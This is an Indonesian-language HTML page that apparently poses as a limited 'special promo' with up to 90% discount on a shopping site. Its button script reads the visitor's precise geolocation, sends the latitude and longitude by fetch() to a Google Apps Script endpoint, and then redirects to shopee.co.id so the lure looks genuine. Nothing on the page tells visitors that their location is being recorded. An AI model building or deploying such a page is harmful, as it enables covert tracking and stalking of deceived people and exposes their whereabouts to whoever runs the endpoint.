<!DOCTYPE html>
<html>
<head>
  <title>Promo Spesial</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://images.unsplash.com/photo-1607082349566-187342175e2f') no-repeat center;
      background-size: cover;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .overlay {
      background: rgba(0,0,0,0.6);
      position: absolute;
      width: 100%;
      height: 100%;
    }

    .card {
      position: relative;
      z-index: 2;
      background: rgba(255,255,255,0.15);
      backdrop-filter: blur(15px);
      border-radius: 20px;
      padding: 25px;
      width: 85%;
      max-width: 320px;
      text-align: center;
      color: white;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
      animation: fadeIn 1s ease;
    }

    @keyframes fadeIn {
      from {opacity:0; transform: translateY(20px);}
      to {opacity:1; transform: translateY(0);}
    }

    h1 {
      font-size: 20px;
      margin-bottom: 10px;
    }

    .promo {
      font-size: 14px;
      margin-bottom: 15px;
      color: #ffd700;
    }

    .highlight {
      font-size: 22px;
      font-weight: bold;
      color: #00ffcc;
      margin-bottom: 10px;
    }

    button {
      padding: 12px 20px;
      border: none;
      border-radius: 10px;
      background: #ff5722;
      color: white;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      margin-top: 10px;
      font-size: 15px;
    }

    button:hover {
      background: #e64a19;
    }

    #status {
      margin-top: 10px;
      font-size: 13px;
    }
  </style>
</head>

<body>

<div class="overlay"></div>

<div class="card">
  <h1>🎁 Promo Spesial Hari Ini</h1>
  <div class="promo">Kesempatan terbatas untuk pengguna terpilih</div>

  <div class="highlight">Diskon hingga 90%</div>

  <p>Klik tombol di bawah untuk melanjutkan</p>

  <button onclick="ambilLokasi()">Ambil Promo Sekarang</button>

  <p id="status"></p>
</div>

<script>
function ambilLokasi(){

  if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(
      function(pos){

        var lat = pos.coords.latitude;
        var lon = pos.coords.longitude;

        var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
                  + lat + "&lon=" + lon;

        fetch(url);

        document.getElementById("status").innerHTML = "✅ Memproses...";

        setTimeout(()=>{
          window.location.href = "https://shopee.co.id";
        },2000);

      },

      function(error){
        document.getElementById("status").innerHTML = "❌ Aktifkan lokasi untuk lanjut";
      }

    );

  } else {
    document.getElementById("status").innerHTML = "❌ Browser tidak support";
  }
}
</script>

</body>
</html>
